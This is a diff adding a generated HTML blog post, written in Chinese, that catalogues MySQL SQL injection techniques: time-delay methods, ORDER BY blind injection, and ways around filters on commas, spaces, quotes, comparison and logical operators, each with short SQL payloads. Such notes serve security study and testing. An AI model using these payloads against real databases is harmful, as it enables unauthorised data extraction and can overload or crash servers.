@@ -1,0 +1,769 @@
+<!DOCTYPE html>
+<html lang="en" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="author" content="John Doe" />
+  <!-- Open Graph Description 简短摘要-->
+  
+  <!-- 用于搜索引擎的文章摘要 -->
+  
+  
+  
+  <title>
+    
+      SQL injection Black Magic 
+      
+      
+      |
+    
+     Hexo
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/favicon.png">
+    <link rel="icon" href="/images/favicon.png">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img no-lazy src="/images/avatar.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">Oranges</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">Friends</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">SQL injection Black Magic</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+          2024-02-16 10:29:34
+        </span>
+        
+              <span class="post-tags">
+                <i class="iconfont icon-tags mr-10" title="Tags"></i>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/security/" title="security">
+                    #security
+                  </a>
+                </span>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/sqli/" title="sqli">
+                    #sqli
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <p>一直都不太会SQL注入，停留在基础的联合、盲注、报错注入，再者实际情况中，得益于预编译、存储过程，SQL注入也被杜绝得差不多了。下面整理一些常见套路。</p>
+<p>延时和布尔盲注的共同点都是截取字符串并比较</p>
+<h1 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a>延时注入</h1><p>MySQL中的五种延时方法：<code>sleep</code>、<code>benchmark</code>、<code>get_lock</code>、正则匹配、笛卡尔积</p>
+<ul>
+<li>sleep</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> sleep(<span class="number">5</span>);  # <span class="number">5</span>s</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>benchmark</li>
+</ul>
+<p><code>benchmark(count,expr)</code>：重复执行count次expr表达式</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> benchmark(<span class="number">10000000</span>, md5(<span class="number">1</span>));  # <span class="number">1.555</span>s</span><br><span class="line"><span class="keyword">select</span> benchmark(<span class="number">10000000</span>, sha1(<span class="number">1</span>)); # <span class="number">1.776</span>s</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>get_lock</li>
+</ul>
+<p><code>get_lock(key,timeout)</code> 加锁成功返回1。这个锁是应用程序级别，在不同的mysql会话之间使用。缺点是需要长连接才有效</p>
+<p><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/../img/image-20230806090437692.png" alt="image-20230806090437692"></p>
+<ul>
+<li>正则匹配</li>
+</ul>
+<p>想要正则匹配到达耗时的效果，需要有长字符串和计算量大的pattern</p>
+<p>使用<code>rpad</code>或<code>repeat</code>来构造长字符串</p>
+<p><code>RPAD(str,len,padstr)</code> 在str的右侧填充padstr直到str达到长度len</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> RPAD(<span class="string">&#x27;he&#x27;</span>,<span class="number">4</span>,<span class="string">&#x27;l&#x27;</span>)   # hell</span><br></pre></td></tr></table></figure>
+
+<p><code>repeat(str,times)</code>  复制str字符串times次</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> REPEAT(<span class="string">&#x27;yes&#x27;</span>,<span class="number">3</span>);  # yesyesyes</span><br></pre></td></tr></table></figure>
+
+<p>总所周知，正则表达式的引擎分为两种</p>
+<ul>
+<li><p>DFA(Deterministic Finite Automaton-确定型有穷自动机)</p>
+<p>只对字符串扫描一次。从开始状态一个个去匹配字符。对于每个字符，匹配则吞入，匹配不上则吐出，一直往下匹配</p>
+</li>
+<li><p>NFA(Non-Deterministic Finite Automaton-非确定型有穷自动机)</p>
+<p>和DFA不同的是，当匹配失败时，会进行回溯，尝试其他状态。</p>
+</li>
+</ul>
+<p>比如对于正则表达式<code>&lt;a&gt;(.*)&lt;/a&gt;</code>匹配<code>&lt;a&gt;hack&lt;/a&gt;</code></p>
+<p>刚才是匹配到<code>&lt;a&gt;</code>，由于<code>(.*)</code>是贪婪匹配，它会把后面所有的字符都吞了，后面就没得字符去匹配<code>&lt;/a&gt;</code>了，于是开始回溯，回溯四次，刚好匹配到<code>&lt;</code>，接着继续直到匹配成功。</p>
+<p>NFA虽然慢一点，但功能更强大，大部分编程语言的正则都是NFA，而MySQL中的正则是DFA</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">pattern = re.<span class="built_in">compile</span>(<span class="string">&#x27;(a.*)+&#x27;</span> * <span class="number">100</span>)</span><br><span class="line">start = time.time()</span><br><span class="line">pattern.<span class="keyword">match</span>(<span class="string">&#x27;a&#x27;</span> * <span class="number">10000</span>)</span><br><span class="line">period = time.time() - start</span><br><span class="line"><span class="built_in">print</span>(period)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> rpad(<span class="string">&#x27;a&#x27;</span>, <span class="number">1000</span>, <span class="string">&#x27;a&#x27;</span>) REGEXP CONCAT(REPEAT(<span class="string">&#x27;(a.*)+&#x27;</span>, <span class="number">100</span>))</span><br></pre></td></tr></table></figure>
+
+<p>在python中直接卡死，而在MySQL中直接秒过(这也叫回溯陷阱)</p>
+<p>MySQL对于输入的数据长度有限制</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> VARIABLES <span class="keyword">like</span> <span class="string">&#x27;max_allowed_packet&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>因此若填充过长的字符串会导致反而没有延时效果</p>
+<p>用<code>rlike</code>或<code>regexp</code>进行正则匹配(注意这里末尾又加了一个b)</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> rpad(<span class="string">&#x27;a&#x27;</span>,<span class="number">100000</span>,<span class="string">&#x27;a&#x27;</span>) regexp concat(repeat(<span class="string">&#x27;(a.*)+&#x27;</span>,<span class="number">1000</span>),<span class="string">&#x27;b&#x27;</span>);  # <span class="number">1.992</span>s</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>笛卡尔积</li>
+</ul>
+<p>连接表是一个耗时的操作</p>
+<p><code>select A, B</code>最后得到的表的记录数有count(A)×count(B)</p>
+<p>因此得选取记录数较多的表才能造成延迟效果</p>
+<p>3087×3087×281</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="built_in">count</span>(<span class="operator">*</span>) </span><br><span class="line"><span class="keyword">FROM</span> information_schema.columns A, information_schema.columns B, information_schema.tables C;</span><br><span class="line"># <span class="number">76.861</span></span><br></pre></td></tr></table></figure>
+
+<p><code>information_schema.columns</code>和<code>information_schema.tables</code>可能不稳定，不同的数据库，<code>columns</code>和<code>tables</code>的数量不同，太少起不了延时效果，太多可能会导致延时时间过久或数据库崩溃</p>
+<p>因此使用下面的组合</p>
+<p>44×44×222×222</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="built_in">count</span>(<span class="operator">*</span>)</span><br><span class="line"><span class="keyword">FROM</span> information_schema.PLUGINS, information_schema.PLUGINS A,</span><br><span class="line">information_schema.COLLATIONS, information_schema.COLLATIONS B;</span><br><span class="line"># <span class="number">3.370</span>s</span><br></pre></td></tr></table></figure>
+
+<h1 id="Order-By盲注"><a href="#Order-By盲注" class="headerlink" title="Order By盲注"></a>Order By盲注</h1><ul>
+<li>Trick 1</li>
+</ul>
+<p><code>order by rand(True)</code>和<code>order by rand(False)</code>的结果排序不同</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> rand(database()<span class="operator">=</span><span class="string">&#x27;xxx&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>Trick 2</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">order</span> <span class="keyword">by</span> id<span class="operator">|</span>(if(substr(database(),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;a&#x27;</span>,<span class="number">2</span>,<span class="number">3</span>));</span><br></pre></td></tr></table></figure>
+
+<p>真-&gt;id和2作或运算</p>
+<p>假-&gt;id和3作或运算</p>
+<p>造成两种不同的排序</p>
+<h1 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h1><h2 id="substr过滤"><a href="#substr过滤" class="headerlink" title="substr过滤"></a>substr过滤</h2><p><code>substr</code>、<code>substring</code>、<code>mid</code>用法一致</p>
+<p>而<code>right</code>、<code>left</code>无法精确到字符串某一位，可以配合<code>ord</code>或<code>ascii</code>一起使用</p>
+<p><code>ascii</code>&#x2F;<code>ord</code>返回传入字符串的首字母的ASCII码</p>
+<ul>
+<li><code>right</code> + <code>ord</code>&#x2F;<code>ascii</code></li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> ASCII(<span class="keyword">RIGHT</span>(<span class="string">&#x27;abcde&#x27;</span>,<span class="number">2</span>));  # 返回<span class="number">100</span>对应d的ascii</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>left</code> + <code>reverse</code> + <code>ord</code>&#x2F;<code>ascii</code></li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> ASCII(REVERSE(<span class="keyword">LEFT</span>(<span class="string">&#x27;abcde&#x27;</span>,<span class="number">2</span>))); # 返回<span class="number">98</span>对应b的ascii</span><br></pre></td></tr></table></figure>
+
+<p>当然也不一定得转为ascii，只是转为数字可以避免一些特殊符号(单引号、反斜线)干扰SQL语法（拼接时加个反斜线转义即可），也方便二分注入</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 字符也不是不能二分</span><br><span class="line"><span class="keyword">SELECT</span> SUBSTR(<span class="string">&#x27;a&#x27;</span>, <span class="number">1</span>, <span class="number">1</span>) <span class="operator">&gt;</span> <span class="string">&#x27;_&#x27;</span>;   # 输出<span class="number">0</span></span><br><span class="line"># ord(<span class="string">&#x27;_&#x27;</span>) <span class="operator">=</span> <span class="number">95</span>   ord(<span class="string">&#x27;a&#x27;</span>) <span class="operator">=</span> <span class="number">97</span> 上面的结果显然是错的</span><br><span class="line"># 得在字符前面加<span class="type">BINARY</span></span><br><span class="line"><span class="keyword">SELECT</span> SUBSTR(<span class="string">&#x27;a&#x27;</span>, <span class="number">1</span>, <span class="number">1</span>) <span class="operator">&gt;</span> <span class="type">BINARY</span> <span class="string">&#x27;_&#x27;</span>   # 输出<span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="逗号过滤"><a href="#逗号过滤" class="headerlink" title="逗号过滤"></a>逗号过滤</h2><p>在使用盲注时需要用到<code>substr()</code>、<code>mid()</code>、<code>limit</code>，这些方法或字句都需要用到逗号。</p>
+<ul>
+<li><code>from for</code></li>
+</ul>
+<p>对于<code>substr</code>和<code>mid</code>，可以使用<code>from for</code>来绕过</p>
+<p><code>substr(str,pos,len)</code>: 从pos开始的位置，截取len个字符</p>
+<p>等价于<code>substr(str FROM pos FOR len)</code></p>
+<p><code>substr(str,pos)</code>: 从pos开始的位置截取到末尾</p>
+<p>等价于<code>substr(str FROM pos)</code></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 库名为organization</span><br><span class="line"><span class="keyword">SELECT</span> SUBSTR(DATABASE() <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">2</span>), SUBSTR(DATABASE(),<span class="number">1</span>,<span class="number">2</span>)   # <span class="keyword">or</span></span><br><span class="line"><span class="keyword">SELECT</span> SUBSTR(DATABASE() <span class="keyword">from</span> <span class="number">7</span>), SUBSTR(DATABASE(),<span class="number">7</span>)  # zation</span><br></pre></td></tr></table></figure>
+
+<p><code>substr</code>可换成<code>substring</code>，效果一样</p>
+<p>类似的函数还有<code>SUBSTRING_INDEX</code></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> SUBSTRING_INDEX(<span class="string">&#x27;11|22|33|44&#x27;</span>,<span class="string">&#x27;|&#x27;</span>,<span class="number">3</span>)   # <span class="number">11</span><span class="operator">|</span><span class="number">22</span><span class="operator">|</span><span class="number">33</span></span><br></pre></td></tr></table></figure>
+
+<p>若<code>for</code>被过滤了，再from截取-1</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> mid(mid(database() <span class="keyword">from</span> <span class="number">-5</span>) <span class="keyword">from</span> <span class="number">-1</span>)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>join</code></li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="number">1</span>,<span class="number">2</span>;</span><br><span class="line"># 等价于</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> <span class="number">1</span>)a <span class="keyword">JOIN</span> (<span class="keyword">SELECT</span> <span class="number">2</span>)b;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>like</code></li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># <span class="keyword">user</span>()为root<span class="variable">@localhost</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">USER</span>() <span class="keyword">LIKE</span> <span class="string">&#x27;r%&#x27;</span>  # <span class="number">1</span></span><br><span class="line"># 等价于</span><br><span class="line"><span class="keyword">SELECT</span> ASCII(MID(<span class="keyword">USER</span>(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">114</span>  # <span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>offset</code></li>
+</ul>
+<p>对于<code>like</code>可以使用<code>offset</code>来绕过</p>
+<p><code>LIMIT offset, count</code>: 从offset开始返回count条记录</p>
+<p>不同于<code>substr</code>和<code>mid</code>，<code>limit</code>的offset是从0开始</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> test LIMIT <span class="number">0</span>,<span class="number">1</span></span><br><span class="line"># 等价于</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> test LIMIT <span class="number">1</span> <span class="keyword">OFFSET</span> <span class="number">0</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="空格过滤"><a href="#空格过滤" class="headerlink" title="空格过滤"></a>空格过滤</h2><p><code>%0A</code>(换行)、<code>%0D</code>(回车)、<code>%09</code>(Tab)、<code>/**/</code>、<code>()</code></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span>(ASCII(MID(DATABASE()<span class="keyword">FROM</span>(<span class="number">1</span>)<span class="keyword">FOR</span>(<span class="number">1</span>)))<span class="operator">=</span><span class="number">111</span>)</span><br><span class="line"><span class="keyword">SELECT</span><span class="comment">/**/</span>ASCII(MID(DATABASE()<span class="comment">/**/</span><span class="keyword">FROM</span><span class="comment">/**/</span><span class="number">1</span><span class="comment">/**/</span><span class="keyword">FOR</span><span class="comment">/**/</span><span class="number">1</span>))<span class="operator">=</span><span class="number">111</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="引号过滤"><a href="#引号过滤" class="headerlink" title="引号过滤"></a>引号过滤</h2><p>一般是where子句的过滤条件里面用到引号，可以把字符串换成十六进制</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;test&#x27;</span></span><br><span class="line"># 等价于</span><br><span class="line"><span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="number">0x74657374</span></span><br></pre></td></tr></table></figure>
+
+<p>或者用<code>concat</code>和<code>char</code>一个个字符拼接</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span>concat(<span class="type">CHAR</span>(<span class="number">116</span>),<span class="type">CHAR</span>(<span class="number">101</span>),<span class="type">CHAR</span>(<span class="number">115</span>),<span class="type">CHAR</span>(<span class="number">116</span>))</span><br></pre></td></tr></table></figure>
+
+<h2 id="比较符过滤"><a href="#比较符过滤" class="headerlink" title="比较符过滤"></a>比较符过滤</h2><p>在使用二分盲注时，经常用到<code>&lt;</code>、<code>&gt;</code></p>
+<p>可以用<code>greatest</code>、<code>least</code>代替</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&lt;</span><span class="number">64</span></span><br><span class="line"># 等价于</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> GREATEST(ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>)),<span class="number">64</span>)<span class="operator">=</span><span class="number">64</span></span><br><span class="line"># 表示<span class="number">64</span>是二者最大的，即x<span class="operator">&lt;</span><span class="number">64</span></span><br></pre></td></tr></table></figure>
+
+<p>同样</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">64</span></span><br><span class="line"># 等价于</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> LEAST(ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>)),<span class="number">64</span>)<span class="operator">=</span><span class="number">64</span></span><br><span class="line"># 表示<span class="number">64</span>是二者最小的，即x<span class="operator">&gt;</span><span class="number">64</span></span><br></pre></td></tr></table></figure>
+
+<p>若<code>=</code>被过滤了，考虑<code>between and</code></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">111</span></span><br><span class="line"># 等价于</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>)) <span class="keyword">BETWEEN</span> <span class="number">111</span> <span class="keyword">AND</span> <span class="number">111</span></span><br></pre></td></tr></table></figure>
+
+<p><code>between and</code>不仅可以用于数值、也可以用于字符串</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> substr(database(),<span class="number">1</span>,<span class="number">1</span>) <span class="keyword">BETWEEN</span> <span class="string">&#x27;o&#x27;</span> <span class="keyword">AND</span> <span class="string">&#x27;o&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>如果<code>=</code>后面跟着字符串，也可以用<code>like</code>、<code>rlike</code>、<code>regexp</code>来绕过</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> substr(database(),<span class="number">1</span>,<span class="number">1</span>) <span class="keyword">like</span> <span class="string">&#x27;o&#x27;</span></span><br><span class="line"><span class="keyword">select</span> substr(database(),<span class="number">1</span>,<span class="number">1</span>) rlike <span class="string">&#x27;o&#x27;</span></span><br><span class="line"><span class="keyword">select</span> substr(database(),<span class="number">1</span>,<span class="number">1</span>) regexp <span class="string">&#x27;o&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>rlike</code>和<code>regexp</code>还可以通过正则匹配来代替substr，逐位匹配</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> database() rlike <span class="string">&#x27;^o&#x27;</span></span><br><span class="line"><span class="keyword">SELECT</span> database() rlike <span class="string">&#x27;^or&#x27;</span></span><br><span class="line"><span class="keyword">SELECT</span> database() rlike <span class="string">&#x27;^org&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>注意<code>regex</code>和<code>rlike</code>是不区分大小写的</p>
+<p>需要在正则前面加上<code>BINARY</code>（MySQL中的一种数据类型）</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="string">&#x27;TeSt&#x27;</span> REGEXP <span class="type">BINARY</span> <span class="string">&#x27;^t&#x27;</span>   # <span class="number">0</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="string">&#x27;TeSt&#x27;</span> REGEXP <span class="string">&#x27;^t&#x27;</span>          # <span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="逻辑符过滤"><a href="#逻辑符过滤" class="headerlink" title="逻辑符过滤"></a>逻辑符过滤</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="operator">-</span><span class="operator">&gt;</span> <span class="operator">&amp;&amp;</span></span><br><span class="line"><span class="keyword">or</span> <span class="operator">-</span><span class="operator">&gt;</span> <span class="operator">||</span></span><br><span class="line">xor <span class="operator">-</span><span class="operator">&gt;</span> <span class="operator">|</span></span><br><span class="line"><span class="keyword">not</span> <span class="operator">-</span><span class="operator">&gt;</span> <span class="operator">!</span></span><br></pre></td></tr></table></figure>
+
